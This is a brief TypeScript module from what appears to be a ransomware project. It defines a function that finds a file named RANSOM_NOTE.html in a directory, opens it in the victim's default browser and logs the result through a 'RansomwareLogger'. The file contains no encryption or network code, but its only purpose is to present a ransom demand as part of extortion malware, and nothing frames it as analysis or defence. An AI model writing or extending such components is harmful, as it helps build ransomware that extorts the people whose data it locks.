import fs from 'fs';
import path from 'path';
import { RansomwareLogger } from './logger';
import open from 'open';

// Initialize logger
const logger = new RansomwareLogger(path.join(process.cwd(), 'logs'));

/**
 * Opens the ransom note HTML file in the default browser
 * @param directory Directory where the ransom note is located
 * @returns Promise that resolves when the operation is complete
 */
export async function openRansomNote(directory: string): Promise<boolean> {
    const htmlNotePath = path.join(directory, 'RANSOM_NOTE.html');
    
    // Check if HTML ransom note exists
    if (!fs.existsSync(htmlNotePath)) {
        logger.error(`Ransom note not found at ${htmlNotePath}`);
        return false;
    }
      try {
        // Open the ransom note in the default browser using the 'open' package
        await open(htmlNotePath);
        
        logger.info(`Opened ransom note in browser: ${htmlNotePath}`);
        return true;
    } catch (error) {
        logger.error(`Failed to open ransom note: ${error}`);
        return false;
    }
}
